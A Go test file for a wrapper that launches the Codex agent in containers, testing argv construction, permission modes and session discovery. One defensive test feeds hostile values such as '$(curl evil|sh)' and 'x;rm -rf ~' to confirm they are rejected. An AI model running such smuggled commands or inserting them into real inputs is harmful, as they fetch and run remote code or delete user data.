package tool

import (
	"os"
	"path/filepath"
	"testing"
	"time"
)

// Compile-time capability assertions: which optional interfaces CodexTool
// implements is part of its contract with session setup (see codex.go).
var (
	_ Tool                    = (*CodexTool)(nil)
	_ ToolWithConfigDirFiles  = (*CodexTool)(nil)
	_ ToolWithPermissionMode  = (*CodexTool)(nil)
	_ ToolWithModel           = (*CodexTool)(nil)
	_ ToolWithEffortLevel     = (*CodexTool)(nil)
	_ ToolWithAutoContextFile = (*CodexTool)(nil)
)

func assertArgv(t *testing.T, got, want []string, label string) {
	t.Helper()
	if len(got) != len(want) {
		t.Fatalf("%s = %v, want %v", label, got, want)
	}
	for i, v := range want {
		if got[i] != v {
			t.Errorf("%s[%d] = %q, want %q", label, i, got[i], v)
		}
	}
}

func TestCodexTool_Basics(t *testing.T) {
	c := NewCodex()

	if c.Name() != "codex" {
		t.Errorf("Name() = %q, want %q", c.Name(), "codex")
	}
	if c.Binary() != "codex" {
		t.Errorf("Binary() = %q, want %q", c.Binary(), "codex")
	}
	if c.ConfigDirName() != ".codex" {
		t.Errorf("ConfigDirName() = %q, want %q", c.ConfigDirName(), ".codex")
	}
	if c.SessionsDirName() != "sessions-codex" {
		t.Errorf("SessionsDirName() = %q, want %q", c.SessionsDirName(), "sessions-codex")
	}
}

// The Coi session ID is never forwarded: codex has no flag to set a session ID
// on a fresh launch, so Coi UUIDs stay metadata-only (like pi).
func TestCodexTool_BuildCommand_NewSession_Bypass(t *testing.T) {
	c := NewCodex()
	cmd := c.BuildCommand("coi-session-uuid", false, "")
	assertArgv(t, cmd, []string{"codex", "--dangerously-bypass-approvals-and-sandbox"}, "BuildCommand(new, bypass)")
}

func TestCodexTool_BuildCommand_NewSession_Interactive(t *testing.T) {
	c := NewCodex()
	c.(ToolWithPermissionMode).SetPermissionMode("interactive")
	cmd := c.BuildCommand("coi-session-uuid", false, "")
	assertArgv(t, cmd, []string{"codex", "-s", "workspace-write", "-a", "on-request"}, "BuildCommand(new, interactive)")
}

func TestCodexTool_BuildCommand_Resume_Bypass(t *testing.T) {
	c := NewCodex()
	cmd := c.BuildCommand("", true, "0199a213-81ee-7f21-8f5e-2f8a88e13d51")
	assertArgv(t, cmd,
		[]string{"codex", "resume", "0199a213-81ee-7f21-8f5e-2f8a88e13d51", "--dangerously-bypass-approvals-and-sandbox"},
		"BuildCommand(resume with ID, bypass)")
}

// Without a discovered session ID, resume falls back to --last — this is the
// safety net when the sessions/ layout drifts and DiscoverSessionID finds nothing.
func TestCodexTool_BuildCommand_Resume_NoID(t *testing.T) {
	c := NewCodex()
	cmd := c.BuildCommand("", true, "")
	assertArgv(t, cmd,
		[]string{"codex", "resume", "--last", "--dangerously-bypass-approvals-and-sandbox"},
		"BuildCommand(resume without ID, bypass)")
}

func TestCodexTool_BuildCommand_Resume_Interactive(t *testing.T) {
	c := NewCodex()
	c.(ToolWithPermissionMode).SetPermissionMode("interactive")
	cmd := c.BuildCommand("", true, "0199a213-81ee-7f21-8f5e-2f8a88e13d51")
	assertArgv(t, cmd,
		[]string{"codex", "resume", "0199a213-81ee-7f21-8f5e-2f8a88e13d51", "-s", "workspace-write", "-a", "on-request"},
		"BuildCommand(resume, interactive)")
}

func TestCodexTool_BuildCommand_ModelAndEffort(t *testing.T) {
	c := NewCodex()
	c.(ToolWithModel).SetModel("gpt-5-codex")
	c.(ToolWithEffortLevel).SetEffortLevel("high")
	cmd := c.BuildCommand("id", false, "")
	assertArgv(t, cmd,
		[]string{"codex", "--dangerously-bypass-approvals-and-sandbox", "-m", "gpt-5-codex", "-c", "model_reasoning_effort=high"},
		"BuildCommand(bypass, model+effort)")
}

// The launch argv is joined into a shell command string downstream, so model
// and effort values must be single shell-safe tokens. Unsafe values are
// rejected loudly at the CLI wiring (ValidateCodexFlagValue) and, fail-closed,
// dropped by the setters — they must never reach the argv.
func TestCodexTool_UnsafeFlagValuesNeverReachArgv(t *testing.T) {
	for _, bad := range []string{
		"gpt 5-codex",     // whitespace → argv splitting
		"$(curl evil|sh)", // command substitution
		"x;rm -rf ~",      // command separator
		"'quoted'",        // quote-nesting breakage (tmux path)
		"-mFlagLookalike", // leading dash could inject a flag
	} {
		c := NewCodex()
		c.(ToolWithModel).SetModel(bad)
		c.(ToolWithEffortLevel).SetEffortLevel(bad)
		cmd := c.BuildCommand("id", false, "")
		assertArgv(t, cmd, []string{"codex", "--dangerously-bypass-approvals-and-sandbox"},
			"BuildCommand(unsafe value "+bad+")")

		if err := ValidateCodexFlagValue("model", bad); err == nil {
			t.Errorf("ValidateCodexFlagValue(%q) = nil, want error", bad)
		}
	}
}

func TestValidateCodexFlagValue_AcceptsRealisticValues(t *testing.T) {
	for _, ok := range []string{"", "gpt-5-codex", "o4-mini", "openai/gpt-5.1", "high", "org:model@v2"} {
		if err := ValidateCodexFlagValue("model", ok); err != nil {
			t.Errorf("ValidateCodexFlagValue(%q) = %v, want nil", ok, err)
		}
	}
}

func TestCodexTool_BuildCommand_UnsetKnobsAddNoFlags(t *testing.T) {
	c := NewCodex()
	cmd := c.BuildCommand("id", false, "")
	for _, arg := range cmd {
		if arg == "-m" || arg == "-c" {
			t.Errorf("BuildCommand() with unset model/effort must not emit %q: %v", arg, cmd)
		}
	}
}

// writeRollout creates a codex session file under dir/sessions/<date>/ with the
// given name and mtime, creating parents as needed.
func writeRollout(t *testing.T, dir, date, name string, mtime time.Time) {
	t.Helper()
	day := filepath.Join(dir, "sessions", date)
	if err := os.MkdirAll(day, 0o755); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(day, name)
	if err := os.WriteFile(path, []byte("{}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chtimes(path, mtime, mtime); err != nil {
		t.Fatal(err)
	}
}

func TestCodexTool_DiscoverSessionID_NewestWins(t *testing.T) {
	c := NewCodex()
	dir := t.TempDir()
	base := time.Now().Add(-time.Hour)
	writeRollout(t, dir, "2026/08/11", "rollout-2026-08-11T10-00-00-11111111-1111-4111-8111-111111111111.jsonl", base)
	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T09-30-00-22222222-2222-4222-8222-222222222222.jsonl", base)

	got := c.DiscoverSessionID(dir)
	if got != "22222222-2222-4222-8222-222222222222" {
		t.Errorf("DiscoverSessionID() = %q, want newest (later-dated path) session UUID", got)
	}
}

func TestCodexTool_DiscoverSessionID_SkipsMalformedNames(t *testing.T) {
	c := NewCodex()
	dir := t.TempDir()
	base := time.Now().Add(-time.Hour)
	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T09-30-00-33333333-3333-4333-8333-333333333333.jsonl", base)
	// Newer files that must NOT be picked: wrong extension, no UUID, unrelated name.
	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T10-00-00-44444444-4444-4444-8444-444444444444.jsonl.bak", base.Add(time.Minute))
	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T10-00-00.jsonl", base.Add(time.Minute))
	writeRollout(t, dir, "2026/08/12", "history.jsonl", base.Add(time.Minute))

	got := c.DiscoverSessionID(dir)
	if got != "33333333-3333-4333-8333-333333333333" {
		t.Errorf("DiscoverSessionID() = %q, want the only well-formed session UUID", got)
	}
}

func TestCodexTool_DiscoverSessionID_MissingDir(t *testing.T) {
	c := NewCodex()
	if got := c.DiscoverSessionID(filepath.Join(t.TempDir(), "does-not-exist")); got != "" {
		t.Errorf("DiscoverSessionID(missing dir) = %q, want \"\"", got)
	}
}

// Regression guard: discovery must be path-ordered, NOT mtime-ordered. The
// saved state is round-tripped through `incus file pull`, which does not
// preserve mtimes — after a save, mtimes reflect transfer order, so an
// mtime-based pick would resume whichever file happened to be pulled last.
func TestCodexTool_DiscoverSessionID_IgnoresMtime(t *testing.T) {
	c := NewCodex()
	dir := t.TempDir()
	base := time.Now().Add(-time.Hour)
	// The OLDER session (earlier date path) carries the NEWER mtime, simulating
	// a pull that wrote it last. The later-dated path must still win.
	writeRollout(t, dir, "2026/08/11", "rollout-2026-08-11T10-00-00-55555555-5555-4555-8555-555555555555.jsonl", base.Add(time.Minute))
	writeRollout(t, dir, "2026/08/12", "rollout-2026-08-12T10-00-00-66666666-6666-4666-8666-666666666666.jsonl", base)

	if got := c.DiscoverSessionID(dir); got != "66666666-6666-4666-8666-666666666666" {
		t.Errorf("DiscoverSessionID = %q, want the later-dated session regardless of mtimes", got)
	}
}

// Codex gets NO settings injection: its config is TOML while coi's settings
// merge is JSON-only, so everything travels as BuildCommand flags instead.
func TestCodexTool_GetSandboxSettings_Empty(t *testing.T) {
	c := NewCodex()
	c.(ToolWithPermissionMode).SetPermissionMode("bypass")
	if settings := c.GetSandboxSettings(); len(settings) != 0 {
		t.Errorf("GetSandboxSettings() = %v, want empty map", settings)
	}
}

func TestCodexTool_ConfigDirFiles(t *testing.T) {
	c := NewCodex()
	tcf := c.(ToolWithConfigDirFiles)

	files := tcf.EssentialConfigFiles()
	expected := []string{"auth.json", "config.toml", "AGENTS.md"}
	if len(files) != len(expected) {
		t.Fatalf("EssentialConfigFiles() = %v, want %v", files, expected)
	}
	for i, f := range files {
		if f != expected[i] {
			t.Errorf("EssentialConfigFiles()[%d] = %q, want %q", i, f, expected[i])
		}
	}

	// No JSON settings file to inject into and no sibling state file.
	if got := tcf.SandboxSettingsFileName(); got != "" {
		t.Errorf("SandboxSettingsFileName() = %q, want \"\"", got)
	}
	if got := tcf.StateConfigFileName(); got != "" {
		t.Errorf("StateConfigFileName() = %q, want \"\"", got)
	}
	// Like Claude, setup is skipped when the host has no ~/.codex to seed.
	if tcf.AlwaysSetupConfig() {
		t.Error("AlwaysSetupConfig() = true, want false")
	}
}

func TestCodexTool_AutoContextFile(t *testing.T) {
	c := NewCodex()
	acf := c.(ToolWithAutoContextFile)
	if got := acf.AutoContextFile(); got != ".codex/AGENTS.md" {
		t.Errorf("AutoContextFile() = %q, want %q", got, ".codex/AGENTS.md")
	}
}

func TestCodexTool_DoesNotImplementContainerEnvOrPreLaunch(t *testing.T) {
	c := NewCodex()
	// Codex state (including sessions/) lives inside ~/.codex, which the
	// standard config-dir save/restore already persists — no env redirects or
	// pre-launch filesystem setup needed.
	if _, ok := c.(ToolWithContainerEnv); ok {
		t.Error("CodexTool should NOT implement ToolWithContainerEnv")
	}
	if _, ok := c.(ToolWithPreLaunch); ok {
		t.Error("CodexTool should NOT implement ToolWithPreLaunch")
	}
	if _, ok := c.(ToolWithAutoContextPath); ok {
		t.Error("CodexTool should NOT implement ToolWithAutoContextPath")
	}
}

func TestCodexTool_RegistryLookup(t *testing.T) {
	c, err := Get("codex")
	if err != nil {
		t.Fatalf("Get(\"codex\") returned error: %v", err)
	}
	if c.Name() != "codex" {
		t.Errorf("Name() = %q, want %q", c.Name(), "codex")
	}
}

func TestListSupported_IncludesCodex(t *testing.T) {
	found := false
	for _, name := range ListSupported() {
		if name == "codex" {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("ListSupported() = %v, does not include 'codex'", ListSupported())
	}
}

// codex is opt-in at image build (#698): supported by the registry, absent from
// the default agent set.
func TestDefaultBuildAgents_ExcludesCodex(t *testing.T) {
	for _, name := range DefaultBuildAgents() {
		if name == "codex" {
			t.Errorf("DefaultBuildAgents() = %v, must not include opt-in agent 'codex'", DefaultBuildAgents())
		}
	}
	// Every default agent must be a supported agent.
	supported := make(map[string]bool)
	for _, name := range ListSupported() {
		supported[name] = true
	}
	for _, name := range DefaultBuildAgents() {
		if !supported[name] {
			t.Errorf("DefaultBuildAgents() contains %q, which is not in ListSupported()", name)
		}
	}
}
